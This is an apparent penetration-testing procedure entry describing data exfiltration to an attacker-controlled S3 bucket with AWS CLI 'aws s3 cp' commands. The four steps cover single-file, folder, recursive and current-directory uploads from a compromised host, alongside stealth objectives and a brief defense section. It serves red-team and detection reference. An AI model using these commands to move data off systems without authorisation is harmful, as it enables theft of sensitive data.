---
id: 6630f8a0-7661-48df-b597-7a9bb960ad5b
name: AWS Copy Files or Folder to S3 Bucket
type: procedure
verified: true
submitted: false
created_at: '2020-07-31T04:25:22.690274+00:00'
updated_at: '2024-01-01T00:00:00Z'
tactics:
  - '[[Exfiltration]]'
techniques:
  - '[[Transfer Data to Cloud Account]]'
sub_techniques: []
tags:
  - aws
  - s3
  - exfiltration
  - data-transfer
commands:
  - '[[commands/aws-s3-copy-file-to-bucket]]'
  - '[[commands/aws-s3-copy-file-to-bucket-folder]]'
  - '[[commands/aws-s3-copy-folder-to-bucket-recursively]]'
  - '[[commands/aws-s3-copy-current-folder-contents-to-bucket-recursively]]'
platforms:
  - AWS
  - Linux
tools: []
validated: true
---

# AWS Copy Files or Folder to S3 Bucket

## Summary

This procedure outlines how to use the AWS CLI to copy individual files, folders, or the contents of the current directory to an S3 bucket. It is particularly useful in penetration testing for data exfiltration, where sensitive files are transferred to attacker-controlled S3 storage, or for legitimate file movement during assessments. The process leverages valid AWS credentials to perform uploads, and instructions can be reversed to download from S3 if needed.

## Description

Copying files or folders to an S3 bucket via the AWS CLI enables efficient data transfer in cloud environments. In offensive security contexts, this technique supports exfiltration by uploading stolen data to a bucket under the attacker's control, assuming the attacker has obtained AWS credentials (e.g., via IAM role compromise or key theft). The procedure covers single file uploads, file uploads to specific bucket folders, recursive folder uploads, and uploading the current directory's contents. Each operation requires configured AWS credentials with S3 write permissions. Success is indicated by upload completion messages, and the process can be monitored via S3 access logs on the defender's side.

## Requirements

1. AWS CLI installed and configured with access keys or IAM role providing S3 write permissions to the target bucket.
2. Valid AWS credentials (e.g., access key ID and secret access key) for the account owning or accessible to the S3 bucket.
3. Network access to AWS services (no VPC endpoints required unless restricted).
4. Bash-compatible shell environment (Linux, macOS, or Windows with WSL).

## Defense

- Enable S3 server access logging to monitor upload operations and detect anomalous data transfers.
- Implement IAM least privilege policies to restrict write access to S3 buckets.
- Use AWS CloudTrail to log API calls like s3:PutObject and alert on unexpected uploads from compromised credentials.
- Monitor for unusual data volumes or access patterns from internal hosts to S3 endpoints.

## Objectives

1. Transfer specific files or entire folders to an S3 bucket for exfiltration or storage.
2. Maintain stealth by using legitimate AWS CLI tools to blend with normal administrative activity.
3. Verify successful upload to ensure data integrity and availability in the target bucket.

## Instructions

### Step 1: Copy a Specific File to an S3 Bucket

**Context**: This step uploads a single file directly to the root of the target S3 bucket, ideal for quick exfiltration of small documents or logs.

**Command** ([[commands/aws-s3-copy-file-to-bucket]]):
```bash
aws s3 cp $FILE s3://$AWS_S3_BUCKET
```

> This command initiates the upload using the AWS CLI. Replace $FILE with the local path to the file (e.g., /path/to/secret.txt) and $AWS_S3_BUCKET with the target bucket name (e.g., my-exfil-bucket). The upload progress will be displayed, showing bytes transferred.

### Step 2: Copy a Specific File to an S3 Bucket Folder

**Context**: Use this to organize exfiltrated files into a subfolder within the bucket, helping to categorize data without exposing structure prematurely.

**Command** ([[commands/aws-s3-copy-file-to-bucket-folder]]):
```bash
aws s3 cp $FILE s3://$AWS_S3_BUCKET/$FOLDER/
```

> Specify $FILE as the source file path, $AWS_S3_BUCKET as the bucket, and $FOLDER as the destination subfolder (e.g., exfil/logs/). The trailing slash ensures the file is placed inside the folder. Expect a completion message confirming the upload.

### Step 3: Copy a Folder to a Bucket Recursively

**Context**: For bulk exfiltration, recursively upload an entire directory structure to preserve organization in S3, useful for directories containing multiple sensitive files.

**Command** ([[commands/aws-s3-copy-folder-to-bucket-recursively]]):
```bash
aws s3 cp $FOLDER s3://$AWS_S3_BUCKET/ --recursive
```

> Set $FOLDER to the local directory path (e.g., /stolen/data/) and $AWS_S3_BUCKET to the target. The --recursive flag ensures all contents, including subdirectories, are uploaded. Monitor the output for any permission errors or partial failures.

### Step 4: Copy Current Folder Contents to an S3 Bucket Recursively

**Context**: Quickly exfiltrate the contents of the current working directory to a specific bucket folder, convenient when operating from a compromised host's filesystem.

**Command** ([[commands/aws-s3-copy-current-folder-contents-to-bucket-recursively]]):
```bash
aws s3 cp . s3://$AWS_S3_BUCKET/$FOLDER --recursive --region $AWS_REGION
```

> The "." represents the current directory. Provide $AWS_S3_BUCKET, $FOLDER (e.g., current-exfil/), and $AWS_REGION (e.g., us-east-1). This uploads all files in the current location while respecting the specified region for multi-region setups.
